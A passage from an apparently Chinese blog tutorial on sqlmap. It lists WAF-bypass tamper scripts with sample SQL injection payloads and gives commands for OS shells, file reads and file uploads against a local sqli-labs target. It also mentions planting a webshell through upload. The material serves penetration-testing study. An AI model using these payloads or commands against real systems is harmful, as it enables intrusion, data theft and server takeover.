width="50">*&nbsp;Input:&nbsp;1&nbsp;UNION&nbsp;ALL&nbsp;SELECT&nbsp;NULL,&nbsp;NULL,&nbsp;CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER()&nbsp;AS&nbsp;CHAR),CHAR(32)),CHAR(58,115,114,121,58))#<br>*&nbsp;Output:&nbsp;1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#</td><td width="201"><br></td></tr><tr><td rowspan="2" width="64">*&nbsp;MySQL&nbsp;&lt;&nbsp;5.1</td><td width="18"><strong>19</strong></td><td width="147">halfversionedmorekeywords.py</td><td width="5">关键字前加注释</td><td width="218">*&nbsp;Input:&nbsp;value’&nbsp;UNION&nbsp;ALL&nbsp;SELECT&nbsp;CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER()&nbsp;AS&nbsp;CHAR),CHAR(32)),CHAR(58,97,110,121,58)),&nbsp;NULL,&nbsp;NULL#&nbsp;AND&nbsp;‘QDWa’='QDWa<br>*&nbsp;Output:&nbsp;value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),&nbsp;NULL,&nbsp;NULL#/*!0AND&nbsp;‘QDWa’='QDWa</td><td width="101">*&nbsp;MySQL&nbsp;4.0.18,&nbsp;5.0.22</td></tr><tr><td width="21"><strong>20</strong></td><td width="69">halfversionedmorekeywords.py</td><td width="227">当数据库为 mysql 时绕过防火墙，每个关键字之前添加<br>mysql 版本评论</td><td width="50">1.("value'&nbsp;UNION&nbsp;ALL&nbsp;SELECT&nbsp;CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER()&nbsp;AS&nbsp;CHAR),CHAR(32)),CHAR(58,97,110,121,58)),&nbsp;NULL,&nbsp;NULL#&nbsp;AND&nbsp;'QDWa'='QDWa")<br>2."value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND&nbsp;'QDWa'='QDWa"</td><td width="201">*&nbsp;MySQL&nbsp;4.0.18,&nbsp;5.0.22</td></tr><tr><td width="64">MySQL&nbsp;&gt;=&nbsp;5.1.13</td><td width="18"><strong>21</strong></td><td width="147">space2morehash.py</td><td width="5">空格替换为&nbsp;# 号&nbsp;以及更多随机字符串&nbsp;换行符</td><td width="218">*&nbsp;Input:&nbsp;1&nbsp;AND&nbsp;9227=9227<br>*&nbsp;Output:&nbsp;1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td><td width="101">MySQL&nbsp;5.1.41</td></tr><tr><td rowspan="7" width="64">&nbsp;Oracle</td><td width="18"><strong>1</strong></td><td width="147">greatest.py</td><td width="5">绕过过滤’&gt;’&nbsp;, 用 GREATEST 替换大于号。</td><td width="218">('1&nbsp;AND&nbsp;A&gt;&nbsp;B')<br>'1&nbsp;AND&nbsp;GREATEST(A,B+1)=A'</td><td width="101">*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>2</strong></td><td width="69">apostrophenullencode.py</td><td width="227">绕过过滤双引号，替换字符和双引号。</td><td width="50">tamper("1&nbsp;AND'1'='1")<br>'1&nbsp;AND&nbsp;%00%271%00%27=%00%271'</td><td width="201">*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>3</strong></td><td width="69">between.py</td><td width="227">用 between 替换大于号（&gt;）</td><td width="50">('1&nbsp;AND&nbsp;A&gt;&nbsp;B--')<br>'1&nbsp;AND&nbsp;A&nbsp;NOT&nbsp;BETWEEN&nbsp;0&nbsp;AND&nbsp;B--'</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>4</strong></td><td width="69">charencode.py</td><td width="227">url 编码</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD&nbsp;FROM%20TABLE<br>*&nbsp;Output:&nbsp;%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>5</strong></td><td width="69">randomcase.py</td><td width="227">随机大小写</td><td width="50">*&nbsp;Input:&nbsp;INSERT<br>*&nbsp;Output:&nbsp;InsERt</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>6</strong></td><td width="69">charunicodeencode.py</td><td width="227">字符串&nbsp;unicode&nbsp;编码</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD%20FROM&nbsp;TABLE<br>*&nbsp;Output:&nbsp;%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2000<br>*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;5.1.56<br>*&nbsp;PostgreSQL&nbsp;9.0.3</td></tr><tr><td width="21"><strong>7</strong></td><td width="69">space2comment.py</td><td width="227">Replaces&nbsp;space&nbsp;character&nbsp;(‘&nbsp;‘)&nbsp;with&nbsp;comments&nbsp;‘/**/’</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;id&nbsp;FROM&nbsp;users<br>*&nbsp;Output:&nbsp;SELECT//id//FROM/**/users</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td rowspan="8" width="64">&nbsp;PostgreSQL</td><td width="18"><strong>1</strong></td><td width="147">greatest.py</td><td width="5">绕过过滤’&gt;’&nbsp;, 用 GREATEST 替换大于号。</td><td width="218">('1&nbsp;AND&nbsp;A&gt;&nbsp;B')<br>'1&nbsp;AND&nbsp;GREATEST(A,B+1)=A'</td><td width="101">*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>2</strong></td><td width="69">apostrophenullencode.py</td><td width="227">绕过过滤双引号，替换字符和双引号。</td><td width="50">tamper("1&nbsp;AND'1'='1")<br>'1&nbsp;AND&nbsp;%00%271%00%27=%00%271'</td><td width="201">*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>3</strong></td><td width="69">between.py</td><td width="227">用 between 替换大于号（&gt;）</td><td width="50">('1&nbsp;AND&nbsp;A&gt;&nbsp;B--')<br>'1&nbsp;AND&nbsp;A&nbsp;NOT&nbsp;BETWEEN&nbsp;0&nbsp;AND&nbsp;B--'</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>4</strong></td><td width="69">percentage.py</td><td width="227">asp 允许每个字符前面添加一个 % 号</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD&nbsp;FROM&nbsp;TABLE<br>*&nbsp;Output:&nbsp;%S%E%L%E%C%T&nbsp;%F%I%E%L%D&nbsp;%F%R%O%M&nbsp;%T%A%B%L%E<br>&nbsp;</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2000,&nbsp;2005<br>*&nbsp;MySQL&nbsp;5.1.56,&nbsp;5.5.11<br>*&nbsp;PostgreSQL&nbsp;9.0</td></tr><tr><td width="21"><strong>5</strong></td><td width="69">charencode.py</td><td width="227">url 编码</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD&nbsp;FROM%20TABLE<br>*&nbsp;Output:&nbsp;%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>6</strong></td><td width="69">randomcase.py</td><td width="227">随机大小写</td><td width="50">*&nbsp;Input:&nbsp;INSERT<br>*&nbsp;Output:&nbsp;InsERt</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>7</strong></td><td width="69">charunicodeencode.py</td><td width="227">字符串&nbsp;unicode&nbsp;编码</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD%20FROM&nbsp;TABLE<br>*&nbsp;Output:&nbsp;%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2000<br>*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;5.1.56<br>*&nbsp;PostgreSQL&nbsp;9.0.3</td></tr><tr><td width="21"><strong>8</strong></td><td width="69">space2comment.py</td><td width="227">Replaces&nbsp;space&nbsp;character&nbsp;(‘&nbsp;‘)&nbsp;with&nbsp;comments&nbsp;‘/**/’</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;id&nbsp;FROM&nbsp;users<br>*&nbsp;Output:&nbsp;SELECT//id//FROM/**/users</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="64">Microsoft&nbsp;Access</td><td width="18"><strong>1</strong></td><td width="147">appendnullbyte.py</td><td width="5">在有效负荷结束位置加载零字节字符编码</td><td width="218">('1&nbsp;AND&nbsp;1=1')<br>'1&nbsp;AND&nbsp;1=1%00'<br>&nbsp;</td><td width="101"><br></td></tr><tr><td rowspan="3" width="64">其他</td><td width="18"><br></td><td width="147">chardoubleencode.py</td><td width="5">双 url 编码 (不处理以编码的)</td><td width="218">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD&nbsp;FROM%20TABLE<br>*&nbsp;Output:&nbsp;%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td><td width="101"><br></td></tr><tr><td width="21"><br></td><td width="71">unmagicquotes.py</td><td width="244">宽字符绕过&nbsp;GPC&nbsp;&nbsp;addslashes</td><td width="50">*&nbsp;Input:&nbsp;1′&nbsp;AND&nbsp;1=1<br>*&nbsp;Output:&nbsp;1%bf%27&nbsp;AND&nbsp;1=1–%20</td><td width="201"><br></td></tr><tr><td width="21"><br></td><td width="71">randomcomments.py</td><td width="244">用 /**/ 分割 sql 关键字</td><td width="50">‘INSERT’&nbsp;becomes&nbsp;‘IN//S//ERT’</td><td width="201"><br></td></tr></tbody></table>

###  探测等级和危险等级

Sqlmap 一共有 5 个探测等级，默认是 1。等级越高，说明探测时使用的 payload 也越多。其中 5 级的 payload 最多，会自动破解出 cookie、XFF 等头部注入。当然，等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET 和 POST 的数据都会进行测试，HTTP cookie 在 level 为 2 时就会测试，HTTP  User-Agent/Referer 头在 level 为 3 时就会测试。在不确定哪个参数为注入点时，为了保证准确性，建议设置 level 为 5

sqlmap 一共有 3 个危险等级，也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思，在不确定的情况下，建议设置为 3 级，--risk=3

sqlmap 使用的 payload 在目录：**/usr/share/sqlmap/xml/payloads**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUz7h1v36KLlXORwpxeoclYibvaj32GXW56UYSpEnWB40I7WHEeGkm4CFQ/640?wx_fmt=png)

```
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzJgPD1IcGu3iaXDyIecAONLBCUQtXia78wLkxUDOudgm6JhkHBBu4aFCA/640?wx_fmt=png)

### 伪造 Http Referer 头部

Sqlmap 可以在请求中伪造 HTTP 中的 referer，当探测等级为 3 或者 3 以上时，会尝试对 referer 注入，可以使用 referer 命令来欺骗，比如，我们伪造 referer 头为百度。可以这样

```
referer  http://www.baidu.com
```

### 执行指定的 SQL 语句

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  #执行指定的sql语句
```

然后会提示我们输入要查询的 SQL 语句，注意这里的 SQL 语句最后不要有分号 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzZ1FAfPBtOiaFINic7Oqujw0SjKx2uxmujCZvX6YEB72lV0ZSR6m4Mksw/640?wx_fmt=png)

### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzOUVKxBDpFxB81lYP9RqUxxXib4icPRzEPAyEGNAnfxLjvJ0nDNINk8icA/640?wx_fmt=png) 

### 执行操作系统命令

在数据库为 Mysql、PostgreSql 或者 SQL Server 时，当满足下面三个条件，我们就可以执行操作系统命令

*   网站必须是 root 权限
    
*   攻击者需要知道网站的绝对路径
    
*   GPC 为 off，php 主动转义的功能关闭
    

```
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell  #执行--os-shell命令
```

如果我们不知道网站的根目录的绝对路径的话，我们那里选择 4 brute force search 暴力破解，尝试破解出根目录的绝对路径！ 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzgCUZx8EcL8Dl72rDZiagcPxFJ7EPzQ1SGicL1jPIF5zg0GfEaFr1RUGg/640?wx_fmt=png)

### 从数据库中读取文件

当数据库为 Mysql、PostgreSQL 或 SQL Server，并且当前用户有权限时，可以读取指定文件，可以是文本文件或者二进制文件。

```
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUztgaNhgiciboOL8WlLXgwVSlA2SjAZKT3iaDhbia2EkbrFQ5o37vw1gWreQ/640?wx_fmt=png)

可以看到，文件读取成功了，并且保存成了 /root/.sqlmap/output/192.168.10.1/files/c__test.txt 文件

### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzrkGkS2DYc8fXqTkHwXHGWkTTbnv3vNmfRcjKia5WB0sbvuSrwMazRlA/640?wx_fmt=png)

### 上传文件到数据库服务器中

当数据库为 Mysql、Postgre SQL 或者 Sql Server，并且当前用户有权限使用特定的函数时，可以上传文件到数据库服务器。文件可以是文本，也可以是二进制文件。

所以利用上传文件，我们可以上传一句话木马或者上传 shell 上去。

```
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write test.txt --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzYcNepbjLG6aTPpgB22kxhzwAIAo9hkoaqkwrBwr1MOnaPM9JGI0JWA/640?wx_fmt=png)

这里会问我们是否想验证上传成功，我们选择 y 的话，他就会读取该文件的大小，并且和本地的文件大小做比较，只要大于等于本地文件大小即说明上传功能了![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzmzJozj1s3tFJBMll6uT2A01WoWkUq6OY2316ibD3GFfr86HMwZianQQQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzcbc55FXlenqyBiahUBokG3ib7pPQBfhRaXicaAtHwQtgvLnzq5Jibh0bXg/640?wx_fmt=gif)

来源：谢公子博客

责编：浮夸

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2edCjiaG0xjojnN3pdR8wTrKhibQ3xVUhjlJEVqibQStgROJqic7fBuw2cJ2CQ3Muw9DTQqkgthIjZf7Q/640?wx_fmt=png)

由于文章篇幅较长，请大家耐心。如果文中有错误的地方，欢迎指出。有想转载的，可以留言我加白名单。

最后，欢迎加入谢公子的小黑屋（安全交流群）(QQ 群：783820465)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SjCxEtGic0gSRL5ibeQyZWEGNKLmnd6Um2Vua5GK4DaxsSq08ZuH4Avew/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)